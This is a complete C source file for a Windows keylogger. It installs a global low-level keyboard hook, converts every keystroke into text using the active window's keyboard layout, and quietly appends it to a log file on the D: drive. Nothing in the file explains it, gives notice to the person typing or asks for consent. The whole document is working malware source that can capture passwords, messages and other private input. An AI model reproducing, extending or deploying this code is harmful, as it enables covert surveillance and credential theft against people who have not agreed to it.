#define _INC_OLE
#include <Windows.h>
#undef _INC_OLE
#include <WinUser.h>
#include <stdio.h>

HHOOK KeyboardHook;
WORD lpchar;

void writechr(WORD* c, char count)
{
	const char* fileLocation = "D:\\LOG\\log.txt";
	FILE *f = fopen(fileLocation, "a+");
	if (f != NULL)
	{
		fwrite(c, 1, count, f);
		fclose(f);
	}
}

void writestr(char* c)
{
	const char* fileLocation = "D:\\LOG\\log.txt";
	FILE *f = fopen(fileLocation, "a+");
	if (f != NULL)
	{
		fwrite("[", 1, 1, f);
		fwrite(c, 1, strlen(c), f);
		fwrite("]", 1, 1, f);
		fclose(f);
	}
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{	
	if (nCode == HC_ACTION && (wParam == WM_KEYDOWN) || (wParam == WM_SYSKEYDOWN))
	{
		KBDLLHOOKSTRUCT *HookStruct = (KBDLLHOOKSTRUCT*)lParam;
		char keyname[20];
		DWORD dwMsg = 1;
		dwMsg += HookStruct->scanCode << 16;
		dwMsg += HookStruct->flags << 24;
		int i = GetKeyNameText(dwMsg, keyname, 20);
		if (i == 1)
		{
			SHORT caps = GetKeyState(VK_CAPITAL);
			SHORT shift = GetKeyState(VK_SHIFT);
			BYTE btKeyState[256];
			btKeyState[VK_CONTROL] = 0;
			btKeyState[VK_MENU] = 0;
			GetKeyboardState(btKeyState);

			DWORD ProcessId;
			HKL hklKeyboardLayout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), &ProcessId));

			char count = ToAsciiEx(HookStruct->vkCode, 0, btKeyState, &lpchar, 0, hklKeyboardLayout);
			if (count)
				writechr(&lpchar, count);
		}
		else
		{
			if (i > 1) writestr(keyname);
			Sleep(5);
		}
	}
	
	return CallNextHookEx(KeyboardHook, nCode, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	KeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hInstance, NULL);
	
	MSG msg;
	while (KeyboardHook != 0)
	{
		while (GetMessage(&msg, NULL, 0, 0))
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}

	UnhookWindowsHookEx(KeyboardHook);
	return 0;
}